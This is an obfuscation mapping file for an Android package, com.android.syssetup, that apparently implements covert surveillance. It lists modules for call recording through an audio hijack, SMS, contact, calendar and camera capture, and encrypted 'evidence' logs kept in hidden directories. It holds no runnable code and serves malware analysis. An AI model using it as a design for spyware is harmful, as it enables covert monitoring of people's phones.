android.media.AmrInputStream -> android.media.AmrInputStream:
    21:21:int notification(java.lang.Object) -> absolute
com.android.syssetup.event.EventQuota -> stt.I:
    10:10:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    17:17:void actualGo() -> ak
    23:23:void actualStart() -> al
    29:29:void actualStop() -> am
com.android.syssetup.event.EventSim -> stt.J:
    33:34:void actualStart() -> al
    38:39:void actualStop() -> am
    43:43:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    48:48:void actualGo() -> ak
    57:94:int notification(com.android.syssetup.Sim) -> absolute
    23:23:int notification(java.lang.Object) -> absolute
com.android.syssetup.event.EventSms -> stt.K:
    java.lang.String number -> begin
    java.lang.String msg -> ao
    byte[] $ -> end
    39:48:boolean isInteresting(com.android.syssetup.module.message.Sms,java.lang.String,java.lang.String) -> absolute
    53:56:void actualStart() -> al
    60:62:void actualStop() -> am
    67:83:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    89:89:void actualGo() -> ak
    117:124:int notification(com.android.syssetup.module.message.Sms) -> absolute
    27:27:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.event.EventStandby -> stt.L:
    27:28:void actualStart() -> al
    32:34:void actualStop() -> am
    38:38:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    44:44:void actualGo() -> ak
    49:57:int notification(com.android.syssetup.Standby) -> absolute
    17:17:int notification(java.lang.Object) -> absolute
com.android.syssetup.event.EventTimer -> stt.M:
    long oneDayMs -> cI
    boolean nextDailyIn -> cz
    long start -> cJ
    long stop -> cK
    java.util.Date timestart -> cL
    java.util.Date timestop -> cM
    boolean needExitOnStop -> cA
    61:98:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    108:121:void actualStart() -> al
    130:181:boolean setDailyDelay(boolean) -> for
    185:215:void initialSetDelay() -> bA
    228:255:void actualGo() -> ak
    264:266:void actualStop() -> am
com.android.syssetup.event.FactoryEvent -> stt.N:
    byte[] $ -> end
    21:122:com.android.syssetup.event.BaseEvent create(java.lang.String,java.lang.String) -> begin
    17:17:com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.event.NullEvent -> stt.O:
    12:12:boolean parse(com.android.syssetup.conf.ConfEvent) -> and
    20:20:void actualGo() -> ak
    27:27:void actualStart() -> al
    34:34:void actualStop() -> am
com.android.syssetup.evidence.EvDispatcher -> stt.P:
    com.android.syssetup.evidence.EvDispatcher singleton -> cN
    java.util.concurrent.LinkedBlockingQueue queue -> cO
    java.util.HashMap evidences -> cP
    boolean halt -> cQ
    java.io.File sdDir -> cR
    boolean running -> cS
    100:108:com.android.syssetup.evidence.EvDispatcher self() -> bB
    115:159:void processQueue() -> bC
    181:202:void run() -> run
    213:225:void send(com.android.syssetup.Packet) -> absolute
    234:237:void halt() -> bD
    240:240:boolean isRunning() -> isRunning
    254:261:boolean createEv(com.android.syssetup.Packet) -> and
    275:284:void atomicEv(com.android.syssetup.Packet) -> array
    292:296:void itemsEv(com.android.syssetup.Packet) -> asm
    305:316:boolean writeEv(com.android.syssetup.Packet) -> begin
    320:331:boolean appendEv(com.android.syssetup.Packet) -> case
    342:365:boolean closeEv(com.android.syssetup.Packet) -> const
com.android.syssetup.evidence.Evidence -> stt.Q:
    boolean firstSpace -> cT
    boolean enoughSpace -> cU
    java.util.Date timestamp -> cV
    java.lang.String fileName -> cW
    com.android.syssetup.file.AutoFile fconn -> cX
    com.android.syssetup.crypto.Encryption encryption -> cY
    com.android.syssetup.evidence.EvidenceCollector evidenceCollector -> cZ
    com.android.syssetup.evidence.EvidenceDescription evidenceDescription -> da
    com.android.syssetup.Device device -> db
    int typeEvidenceId -> dc
    int progressive -> dd
    byte[] aesKey -> bM
    byte[] encData -> de
    byte[] lastBlock -> df
    171:185:boolean enoughSpace() -> bE
    199:224:boolean close() -> bF
    234:234:boolean createEvidence(byte[]) -> of
    254:343:boolean createEvidence(byte[],int) -> destructor
    357:406:byte[] makeDescription(byte[],int) -> div
    416:416:boolean writeEvidence(byte[]) -> operator
    434:466:boolean writeEvidence$1cf967a0(byte[],int) -> do
    477:490:boolean writeEvidences(java.util.ArrayList) -> absolute
    499:538:boolean appendEvidence$1cf967a0(byte[],int) -> downto
    568:571:void atomicWriteOnce(java.util.ArrayList) -> and
    584:584:java.lang.String toString() -> toString
com.android.syssetup.evidence.EvidenceBuilder -> stt.R:
    int E_DELIMITER -> dg
    boolean firstInfo -> dh
    int type -> type
    long unique -> di
    com.android.syssetup.evidence.EvDispatcher disp -> dj
    boolean hasData -> dk
    byte[] $ -> end
    124:126:void atomic(int,byte[],byte[]) -> absolute
    132:134:void atomic$709763c4(java.util.ArrayList) -> array
    148:160:void info(java.lang.String) -> info
    166:178:void infoStart() -> bG
    181:189:com.android.syssetup.Packet init(int) -> file
    198:207:void send(com.android.syssetup.Packet) -> absolute
    215:222:void write(byte[]) -> write
    226:240:void write(java.util.ArrayList) -> asm
    243:300:void write(java.io.DataInputStream,int) -> absolute
    306:310:void close() -> close
    314:320:void immediateClose() -> bH
    323:323:boolean hasData() -> bI
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.evidence.EvidenceCollector -> stt.S:
    java.lang.String LOG_EXTENSION -> dl
    java.lang.String LOG_TMP -> dm
    java.lang.String PROG_FILENAME -> dn
    com.android.syssetup.evidence.EvidenceCollector singleton -> dp
    java.lang.Object evidenceCollectorLock -> dq
    java.util.Vector logVector -> dr
    java.lang.String prefix -> ds
    int logProgressive -> dt
    byte[] $ -> end
    int $$ -> record
    111:119:com.android.syssetup.evidence.EvidenceCollector self() -> bJ
    129:129:java.lang.String decryptName(java.lang.String) -> oh
    141:142:java.lang.String encryptName(java.lang.String) -> oi
    152:159:java.lang.String makeDateName(java.util.Date) -> absolute
    174:203:java.util.Vector scanForDirLogs(java.lang.String) -> oj
    224:273:java.lang.String[] scanForEvidences(java.lang.String,java.lang.String) -> const
    277:283:boolean notVeryOld(java.io.File,java.lang.String) -> and
    290:334:void flushEvidences() -> bK
    360:377:int deserializeProgressive() -> bL
    386:405:int getNewProgressive() -> bM
    416:453:com.android.syssetup.evidence.Name makeNewName(com.android.syssetup.evidence.Evidence,java.lang.String) -> absolute
    463:465:void remove(java.lang.String) -> remove
    476:477:int removeHidden() -> bN
    488:526:int removeRecursive(java.io.File,int) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.evidence.EvidenceDescription -> stt.T:
    int length -> length
    int version -> version
    int logType -> du
    int hTimeStamp -> dv
    int lTimeStamp -> dw
    int deviceIdLen -> dx
    int userIdLen -> dy
    int sourceIdLen -> dz
    int additionalData -> dA
    66:71:byte[] getBytes() -> getBytes
    81:92:void serialize$49634b87(byte[]) -> or
com.android.syssetup.evidence.Markup -> stt.U:
    byte markupSeed -> dB
    boolean markupInit -> dC
    com.android.syssetup.crypto.Encryption encryption -> cY
    java.lang.String markupId -> dD
    105:128:java.lang.String makeMarkupName$185c6b75(java.lang.String) -> ok
    132:137:int getMarkupSeed() -> bO
    180:186:boolean isMarkup() -> bP
    205:242:byte[] readMarkup() -> bQ
    263:270:void removeMarkup() -> bR
    285:307:boolean writeMarkup(byte[]) -> packed
    311:315:boolean writeMarkupSerializable(java.io.Serializable) -> absolute
    319:333:java.lang.Object readMarkupSerializable() -> bS
    339:364:java.io.Serializable unserialize(java.io.Serializable) -> and
    370:376:void serialize(java.io.Serializable) -> array
com.android.syssetup.evidence.Name -> stt.V:
    int progressive -> dd
    java.lang.String basePath -> dE
    java.lang.String blockDir -> dF
    java.lang.String encName -> dG
    java.lang.String fileName -> cW
com.android.syssetup.file.AutoFile -> stt.W:
    java.io.File file -> file
    java.lang.String filename -> filename
    73:104:java.lang.String getFileContents(java.lang.String) -> ol
    113:113:byte[] read() -> bT
    123:163:byte[] read(int,int) -> array
    173:213:byte[] read(int) -> for
    222:223:void write(byte[]) -> write
    235:259:boolean write$1cf927cf$49634b8b(byte[]) -> procedure
    265:266:void write(int) -> write
    274:319:boolean append(byte[]) -> program
    328:328:boolean exists() -> exists
    337:337:boolean canRead() -> canRead
    346:346:boolean isDirectory() -> isDirectory
    358:358:java.lang.String[] list() -> list
    367:367:long getSize() -> getSize
    376:376:java.util.Date getFileTime() -> bU
    380:380:java.lang.String getFilename() -> bV
    384:384:java.lang.String getName() -> getName
    391:399:boolean delete() -> delete
    403:412:boolean dropExtension(java.lang.String) -> om
    416:420:void create() -> create
    432:454:boolean rename(java.lang.String) -> on
    458:458:java.lang.String toString() -> toString
    462:462:long lastModified() -> lastModified
    466:475:void chmod(java.lang.String) -> oo
    481:481:java.io.File getFile() -> bW
com.android.syssetup.file.Directory -> stt.X:
    java.lang.String hiddenDirMacro -> dH
    java.lang.String userProfile -> dI
    java.lang.String userDoc -> dJ
    java.lang.String userPicture -> dK
    byte[] $ -> end
    40:44:java.lang.String expandMacro(java.lang.String) -> op
    48:52:java.lang.String expandMacro(java.lang.String,java.lang.String,java.lang.String) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.file.Path -> stt.Y:
    java.lang.String CONF_DIR -> dL
    java.lang.String MARKUP_DIR -> dM
    java.lang.String LOG_DIR -> dN
    java.lang.String UPLOADS -> dO
    java.lang.String hidden -> dP
    byte[] $ -> end
    76:120:boolean makeDirs(boolean) -> function
    129:160:void setStorage(boolean) -> goto
    163:163:java.lang.String home() -> bX
    172:172:java.lang.String hidden() -> bY
    176:176:java.lang.String doc() -> bZ
    180:180:java.lang.String picture() -> ca
    200:200:java.lang.String conf() -> cb
    209:209:java.lang.String markup() -> cc
    218:218:java.lang.String logs() -> cd
    222:223:java.lang.String uploads() -> ce
    228:228:boolean unprotect(java.lang.String) -> oq
    233:250:boolean unprotect(java.lang.String,int,boolean) -> and
    254:285:boolean unprotect(java.lang.String,boolean) -> absolute
    289:293:boolean unprotect$3b99f9ef(java.lang.String,java.lang.String) -> constructor
    297:305:boolean unprotectAll$505cbf47(java.lang.String) -> os
    312:320:boolean lock(java.lang.String) -> ot
    331:332:boolean removeDirectory(java.lang.String) -> ou
    342:344:boolean createDirectory(java.lang.String) -> ov
    355:369:long freeSpace() -> cf
    381:387:boolean makeDirs() -> cg
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.interfaces.AbstractFactory -> stt.Z:
    com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
com.android.syssetup.interfaces.IncrementalLog -> stt.aa:
    void resetLog() -> ch
com.android.syssetup.interfaces.Observer -> stt.ab:
    int notification(java.lang.Object) -> absolute
com.android.syssetup.interfaces.iProtocol -> stt.ac:
    boolean init(com.android.syssetup.action.sync.Transport) -> absolute
    boolean perform() -> aN
com.android.syssetup.listener.AdR -> com.android.syssetup.listener.AdR:
    19:25:void onEnabled(android.content.Context,android.content.Intent) -> onEnabled
    32:37:void onDisabled(android.content.Context,android.content.Intent) -> onDisabled
    41:45:void onPasswordChanged(android.content.Context,android.content.Intent) -> onPasswordChanged
    49:53:void onPasswordFailed(android.content.Context,android.content.Intent) -> onPasswordFailed
    57:61:void onPasswordSucceeded(android.content.Context,android.content.Intent) -> onPasswordSucceeded
    66:73:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.listener.BAc -> stt.ad:
    byte[] $ -> end
    34:49:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BC -> stt.ae:
    38:40:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.listener.BSm -> stt.af:
    36:46:void memorize(java.lang.String,java.lang.String) -> destructor
    52:54:void cleanMemory() -> ci
    59:149:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.listener.BSm$1 -> stt.ag:
    com.android.syssetup.module.message.Sms val$sms -> dQ
    com.android.syssetup.listener.BSm this$0 -> dR
    136:141:void run() -> run
com.android.syssetup.listener.BSt -> stt.ah:
    byte[] $ -> end
    34:48:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BroadcastMonitorCall -> stt.ai:
    com.android.syssetup.Call call -> dS
    byte[] $ -> end
    23:48:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    53:150:void manageReceive(android.content.Context,android.content.Intent) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.BroadcastMonitorConnectivity -> stt.aj:
    int period -> dT
    boolean stop -> az
    42:72:void run() -> run
    76:77:void onReceive(boolean) -> if
    80:81:void register() -> cj
    84:86:void unregister() -> unregister
com.android.syssetup.listener.BroadcastMonitorSim -> stt.ak:
    int period -> dT
    boolean stop -> az
    36:54:void run() -> run
    58:59:void onReceive(java.lang.String) -> ow
    62:63:void register() -> cj
    66:68:void unregister() -> unregister
com.android.syssetup.listener.Listener -> stt.al:
    java.util.ArrayList observers$7865b31 -> dU
    boolean suspended -> ah
    java.lang.Object suspendLock -> dV
    38:54:boolean attach(com.android.syssetup.interfaces.Observer) -> absolute
    58:77:void detach(com.android.syssetup.interfaces.Observer) -> and
    88:101:int dispatch(java.lang.Object) -> and
    108:117:void suspend() -> suspend
    124:133:void resume() -> resume
    146:148:void setSuspended(boolean) -> implementation
    void start() -> start
    void stop() -> stop
com.android.syssetup.listener.ListenerAc -> stt.am:
    com.android.syssetup.listener.ListenerAc singleton -> dW
    com.android.syssetup.listener.BAc acReceiver -> dX
    byte[] $ -> end
    35:43:com.android.syssetup.listener.ListenerAc self() -> ck
    48:49:void start() -> start
    53:54:void stop() -> stop
    60:69:void registerAc() -> cl
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.ListenerBattery -> stt.an:
    com.android.syssetup.listener.ListenerBattery singleton -> dY
    com.android.syssetup.listener.ListenerBattery$1 batteryReceiver$48665ecd -> dZ
    byte[] $ -> end
    40:48:com.android.syssetup.listener.ListenerBattery self() -> cm
    53:83:void start() -> start
    87:88:void stop() -> stop
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.ListenerBattery$1 -> stt.ao:
    int scale -> and
    int level -> level
    int voltage -> asm
    int temp -> ea
    com.android.syssetup.listener.ListenerBattery this$0 -> eb
    byte[] $ -> end
    61:74:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $$24d420ae() -> until
com.android.syssetup.listener.ListenerCall -> stt.ap:
    com.android.syssetup.listener.ListenerCall singleton -> ec
    com.android.syssetup.listener.BC callReceiver -> ed
    31:39:com.android.syssetup.listener.ListenerCall self() -> cn
    44:45:void start() -> start
    50:50:void stop() -> stop
    56:57:void registerCall() -> co
    61:61:int dispatch(com.android.syssetup.Call) -> and
    14:14:int dispatch(java.lang.Object) -> and
com.android.syssetup.listener.ListenerConnectivity -> stt.aq:
    com.android.syssetup.listener.ListenerConnectivity singleton -> ee
    com.android.syssetup.listener.BroadcastMonitorConnectivity connectivityReceiver -> ef
    31:39:com.android.syssetup.listener.ListenerConnectivity self() -> cp
    44:45:void start() -> start
    49:50:void stop() -> stop
    56:59:void registerConnectivity() -> cq
com.android.syssetup.listener.ListenerProcess -> stt.ar:
    com.android.syssetup.listener.ListenerProcess singleton -> eg
    java.lang.String lastForeground -> eh
    com.android.syssetup.listener.ListenerProcess$BroadcastMonitorProcess bmp -> ei
    boolean started -> started
    java.lang.Object standbyLock -> ej
    java.lang.Object startedLock -> ek
    java.util.concurrent.ScheduledFuture future -> el
    java.util.concurrent.ScheduledExecutorService stpe -> em
    58:66:com.android.syssetup.listener.ListenerProcess self() -> cr
    72:93:void start() -> start
    99:117:void stop() -> stop
    127:141:int dispatch(java.lang.String) -> ox
    147:163:int notification(com.android.syssetup.Standby) -> absolute
    25:25:int notification(java.lang.Object) -> absolute
com.android.syssetup.listener.ListenerProcess$BroadcastMonitorProcess -> stt.ar$absolute:
    com.android.syssetup.listener.ListenerProcess this$0 -> en
    177:182:void run() -> run
com.android.syssetup.listener.ListenerSim -> stt.as:
    com.android.syssetup.listener.ListenerSim singleton -> eo
    com.android.syssetup.listener.BroadcastMonitorSim simReceiver -> ep
    31:39:com.android.syssetup.listener.ListenerSim self() -> cs
    44:45:void start() -> start
    49:50:void stop() -> stop
    56:59:void registerSim() -> ct
com.android.syssetup.listener.ListenerSms -> stt.at:
    com.android.syssetup.listener.ListenerSms singleton -> eq
    com.android.syssetup.listener.BSm smsReceiver -> er
    31:39:com.android.syssetup.listener.ListenerSms self() -> cu
    44:45:void start() -> start
    50:50:void stop() -> stop
    56:57:void registerSms() -> cv
com.android.syssetup.listener.ListenerStandby -> stt.au:
    com.android.syssetup.listener.ListenerStandby singleton -> es
    com.android.syssetup.listener.BSt standbyReceiver -> et
    byte[] $ -> end
    int $$ -> record
    37:45:com.android.syssetup.listener.ListenerStandby self() -> cw
    49:51:boolean isScreenOn() -> isScreenOn
    56:57:void start() -> start
    61:62:void stop() -> stop
    68:78:void registerAc() -> cl
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.listener.WR -> stt.av:
    byte[] $ -> end
    19:67:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.manager.Manager -> stt.aw:
    java.util.HashMap instances -> eu
    java.util.HashMap threads -> ev
    com.android.syssetup.Status status -> ax
    com.android.syssetup.interfaces.AbstractFactory factory -> ew
    55:56:void setFactory(com.android.syssetup.interfaces.AbstractFactory) -> absolute
    59:59:com.android.syssetup.ThreadBase get$1c213d36(java.lang.String) -> oy
com.android.syssetup.manager.ManagerEvent -> stt.ax:
    com.android.syssetup.manager.ManagerEvent singleton -> ex
    byte[] $ -> end
    40:49:com.android.syssetup.manager.ManagerEvent self() -> cx
    61:95:com.android.syssetup.event.BaseEvent createEvent(java.lang.String,com.android.syssetup.conf.ConfEvent) -> absolute
    105:130:boolean startAll() -> cy
    138:160:void stopAll() -> not
    164:193:void start(java.lang.Integer) -> absolute
    197:248:void stop(java.lang.Integer) -> and
    251:259:void enable(int) -> function
    262:270:void disable(int) -> goto
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.manager.ManagerModule -> stt.ay:
    com.android.syssetup.manager.ManagerModule singleton -> ey
    43:52:com.android.syssetup.manager.ManagerModule self() -> cz
    102:125:void stopAll() -> not
    133:184:void start(java.lang.String,com.android.syssetup.Trigger) -> absolute
    187:203:com.android.syssetup.module.BaseModule makeAgent(java.lang.String) -> oz
    211:211:boolean isInstancedAgent(java.lang.Class) -> absolute
    215:215:com.android.syssetup.module.BaseModule getInstancedAgent(java.lang.Class) -> and
    225:259:void stop(java.lang.String) -> oA
    268:275:void resetIncrementalLogs() -> cA
    284:285:java.lang.String getType(java.lang.Class) -> array
com.android.syssetup.module.BaseInstantModule -> stt.az:
    11:27:void run() -> run
    32:32:void actualGo() -> ak
    37:37:void actualStop() -> am
com.android.syssetup.module.BaseModule -> stt.aA:
    com.android.syssetup.conf.ChildConf conf$546a63e5 -> ez
    com.android.syssetup.Trigger trigger -> eA
    boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    36:36:java.lang.String getType() -> getType
    43:44:boolean setConf$239843e2(com.android.syssetup.conf.ChildConf) -> array
    49:49:java.lang.String toString() -> toString
    53:54:void setTrigger(com.android.syssetup.Trigger) -> and
    61:61:void notifyProcess(com.android.syssetup.ProcessInfo) -> and
com.android.syssetup.module.FactoryModule -> stt.aB:
    java.util.Hashtable factorymap -> eB
    java.util.Hashtable typemap -> eC
    byte[] $ -> end
    int $$ -> record
    54:57:java.lang.String getType(java.lang.Class) -> array
    72:88:com.android.syssetup.module.BaseModule create$33cff88d(java.lang.String) -> oB
    20:20:com.android.syssetup.ThreadBase create$7ab2c0f7(java.lang.String,java.lang.String) -> case
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleAddressBook -> stt.aC:
    java.util.HashMap contacts -> eD
    com.android.syssetup.evidence.Markup markupContacts -> eE
    java.lang.String observe -> eF
    com.android.syssetup.module.task.PickContact contact -> eG
    java.lang.String myPhone -> eH
    byte[] $ -> end
    61:74:boolean serializeIfNew(long,byte[]) -> absolute
    79:98:byte[] preparePacket(int,long,java.lang.String,java.lang.String,java.lang.String) -> absolute
    102:121:java.io.ByteArrayOutputStream prepareHeader(long,int,int) -> absolute
    125:144:void addTypedString(java.io.ByteArrayOutputStream,byte,java.lang.String) -> absolute
    147:148:void createEvidenceLocal(int,java.lang.String) -> and
    156:173:void createEvidenceLocal(int,java.lang.String,java.lang.String) -> absolute
    177:190:boolean createEvidenceRemote(int,com.android.syssetup.module.chat.Contact) -> absolute
    194:194:com.android.syssetup.module.ModuleAddressBook getInstance() -> cB
    199:199:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    208:245:void actualStart() -> al
    258:299:void actualGo() -> ak
    303:304:void actualStop() -> am
    319:332:void serializeContacts() -> cC
    335:372:boolean contacts() -> cD
    382:398:byte[] preparePacket(com.android.syssetup.module.task.Contact) -> absolute
    405:420:int notification$2be0cc0f() -> cE
    36:36:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleAddressBook$1 -> stt.aD:
    com.android.syssetup.module.ModuleAddressBook this$0 -> eI
    267:277:long cursor(android.database.Cursor) -> absolute
com.android.syssetup.module.ModuleApplication -> stt.aE:
    com.android.syssetup.evidence.EvidenceBuilder evidenceIncremental -> eJ
    35:35:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    41:41:void actualGo() -> ak
    46:48:void actualStart() -> al
    52:55:void actualStop() -> am
    58:59:int notification(com.android.syssetup.ProcessInfo) -> absolute
    73:91:void saveEvidence(java.lang.String,com.android.syssetup.ProcessStatus) -> absolute
    102:106:void resetLog() -> ch
    29:29:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.ModuleCalendar -> stt.aF:
    com.android.syssetup.evidence.Markup markupCalendar -> eK
    java.util.HashMap calendar -> eL
    byte[] $ -> end
    55:55:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    64:90:void actualStart() -> al
    94:103:int notification(com.android.syssetup.ProcessInfo) -> absolute
    108:109:void actualStop() -> am
    122:134:void actualGo() -> ak
    146:159:void serializeCalendar() -> cF
    173:287:boolean calendar() -> cG
    296:324:java.util.Hashtable selectCalendars(java.lang.String) -> oC
    330:335:android.database.Cursor managedQuery$5eb44419(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String) -> absolute
    346:350:void saveEvidenceCalendar$487efef6(byte[]) -> record
    354:427:byte[] preparePacket(long,java.lang.String,java.lang.String,java.lang.String,java.util.Date,java.util.Date,java.lang.String,java.lang.Boolean) -> absolute
    431:438:void appendCalendarString(java.io.ByteArrayOutputStream,int,java.lang.String) -> absolute
    32:32:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall -> stt.aG:
    byte[] AMR_HEADER -> eM
    java.lang.Object sync -> eN
    java.util.concurrent.LinkedBlockingQueue calls$19f590b5 -> eO
    boolean recordFlag -> eP
    int[] amr_sizes -> eQ
    boolean started -> started
    com.android.syssetup.module.ModuleCall$1 observer$5714f4ea -> eR
    java.lang.Thread queueMonitor -> eS
    com.android.syssetup.module.call.EncodingTask encodingTask -> eT
    com.android.syssetup.util.CallBack hjcb -> eU
    com.android.syssetup.util.Instrument hijack -> eV
    com.android.syssetup.RunningProcesses runningProcesses -> eW
    com.android.syssetup.module.call.CallInfo callInfo -> eX
    java.util.ArrayList chunks$7865b31 -> eY
    boolean[] finished -> eZ
    boolean canRecord -> fa
    boolean isStarted -> fb
    java.lang.Object recordingLock -> fc
    byte[] $ -> end
    96:96:com.android.syssetup.module.ModuleCall self() -> cH
    109:121:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    127:127:void actualGo() -> ak
    131:191:void actualStart() -> al
    195:218:boolean installedWhitelist() -> cI
    224:245:void actualStop() -> am
    248:301:void startWatchAudio() -> cJ
    304:304:boolean isMicAvailable() -> cK
    310:337:boolean installHijack() -> cL
    342:375:void purgeAudio() -> cM
    379:399:void scrubAudio() -> cN
    403:425:boolean addToEncodingList(java.lang.String) -> oD
    438:471:int notification(com.android.syssetup.Call) -> absolute
    482:525:boolean saveCallEvidence(java.lang.String,java.lang.String,boolean,java.util.Date,java.util.Date,java.lang.String,boolean,int,int) -> absolute
    531:539:void closeCallEvidence$66c2d4f6(java.lang.String,java.lang.String,java.util.Date,java.util.Date,int) -> absolute
    542:557:int checkIntegrity(byte[]) -> reintroduce
    573:612:byte[] getCallAdditionalData(java.lang.String,java.lang.String,boolean,com.android.syssetup.util.DateTime,com.android.syssetup.util.DateTime,int,int) -> absolute
    621:654:void saveCalllistEvidence$4b0c3ab0(java.lang.String,java.lang.String,boolean,java.util.Date,int) -> absolute
    672:822:void encodeChunks(com.android.syssetup.file.AutoFile) -> array
    827:833:long getStreamId(java.lang.String) -> oE
    839:847:int getStreamPid(java.lang.String) -> oF
    851:856:void sort_chunks() -> cO
    859:861:void saveCallEvidence(java.lang.String,java.lang.String,com.android.syssetup.module.call.Chunk,int) -> absolute
    868:886:void saveAllEvidences$2d9f8692(java.util.ArrayList,com.android.syssetup.module.call.CallInfo,java.util.Date,java.util.Date) -> absolute
    893:893:boolean canRecord() -> cP
    897:897:boolean isBooted() -> cQ
    59:59:int notification(java.lang.Object) -> absolute
    59:59:boolean access$000(com.android.syssetup.module.ModuleCall,java.lang.String) -> absolute
    59:59:com.android.syssetup.module.call.EncodingTask access$100(com.android.syssetup.module.ModuleCall) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$1 -> stt.aH:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    279:297:void onEvent(int,java.lang.String) -> onEvent
com.android.syssetup.module.ModuleCall$2 -> stt.aI:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    byte[] $ -> end
    346:346:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$3 -> stt.aJ:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    byte[] $ -> end
    383:383:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleCall$4 -> stt.aK:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    853:853:int compare(com.android.syssetup.module.call.Chunk,com.android.syssetup.module.call.Chunk) -> absolute
    851:851:int compare(java.lang.Object,java.lang.Object) -> compare
com.android.syssetup.module.ModuleCall$HC -> stt.aG$absolute:
    com.android.syssetup.module.ModuleCall this$0 -> fd
    86:116:byte[] inputStreamToBuffer$4dfd4f08(java.io.InputStream) -> absolute
    132:158:boolean equals$5c8eef72(byte[],byte[],int) -> absolute
    190:203:int byteArrayToInt(byte[],int) -> else
    211:224:long byteArrayToLong$49634b7b(byte[]) -> repeat
    234:238:byte[] intToByteArray(int) -> if
    248:252:byte[] longToByteArray(long) -> begin
    262:262:java.lang.String byteArrayToHex(byte[]) -> self
    275:288:java.lang.String byteArrayToHex$55a39fc4(byte[],int) -> end
    292:298:byte[] hexStringToByteArray(java.lang.String) -> oG
    304:309:byte[] hexStringToByteArray$52f4461e(java.lang.String,int) -> array
    324:328:byte[] concat(byte[],int,byte[],int) -> absolute
    353:355:byte[] copy(byte[],int,int) -> and
    379:384:byte[] padByteArray$1cf9d9ca(byte[]) -> set
com.android.syssetup.module.ModuleCamera -> stt.aL:
    int counter -> fe
    44:45:void callback(byte[]) -> shl
    58:58:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    72:79:void actualStart() -> al
    90:105:void snapshot() -> cR
